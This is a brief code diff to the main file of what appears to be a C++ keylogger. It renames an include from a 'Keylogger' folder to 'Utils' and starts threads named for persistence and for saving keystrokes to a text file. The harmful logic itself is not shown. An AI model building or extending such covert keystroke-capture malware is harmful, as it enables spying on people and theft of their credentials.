@@ -1,9 +1,9 @@
-#include "Keylogger/functions.cpp"
 #include "Utils/keyboard.h"
+#include "Utils/functions.h"
 
 int main()
 {
-	std::thread t1;
+    std::thread t1;
 	std::thread t2;
 	t1 = std::thread(PersistantApplication);
 	t2 = std::thread(saveInTextFile);
